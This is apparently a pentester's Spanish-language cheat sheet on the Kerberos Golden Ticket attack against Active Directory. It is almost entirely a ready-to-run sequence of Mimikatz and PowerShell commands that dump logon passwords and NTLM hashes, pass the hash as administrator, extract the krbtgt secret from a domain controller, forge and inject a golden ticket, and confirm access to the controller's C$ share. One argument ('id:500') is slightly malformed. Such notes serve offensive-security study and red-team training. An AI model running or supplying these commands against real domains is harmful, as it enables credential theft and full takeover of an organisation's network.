# Golden Ticket 

Tags: #AD #Windows #Powershell 

Es un ataque de ciberseguridad malicioso donde un atacante gana acceso ilimitado a un dominio de una organización, accesando a la data almacenada en AD. Explota una vulnerabilidad en el protocolo de autenticacion de Kerberos, donde es usado para acceder al AD, permitiendo al atacante un 'bypass' normal. 

```powershell
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 
 	
❯ . .\PowerView.ps1                          # Importamos el modulo
❯ . .\Invoke-Mimikatz.ps1 
❯  Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM hash, SID de todos los usuarios asi como el del 'Admin'

# Ahora haremos el Pass The Hash 
❯ Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:<Domain> /ntlm:<NTLM-Hash> /run:powershell.exe"' 
```

```powershell 
# En la nueva consola que se abre con el comando anterior vamos a extraer hash de kerberos de las password de las cuentas
❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
 	# ep = Ejecutar politicas 

❯ . .\Invoke-Mimikatz.ps1 
❯  Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DomainController> # Muestra info de los secretos de LSA y copiamos el NTLM de 'krbtgt'
```

```powershell
# Regresamos a la primer consola, generamos e inyectamos el 'Golden Ticket'
❯ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<Domain> /sid:12345 /krbtgt:<krbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'  # Generamos e inyectamos nuestro 'Golden Ticket' 

❯ klist                                      # Muestra info del ticket 
	❯ klist purge                           # Si hacemos mal el ticket los podemos eliminar asi 
❯ ls \\DomainController\C$                   # Verificar si ingresamos al 'Domain Controller'
```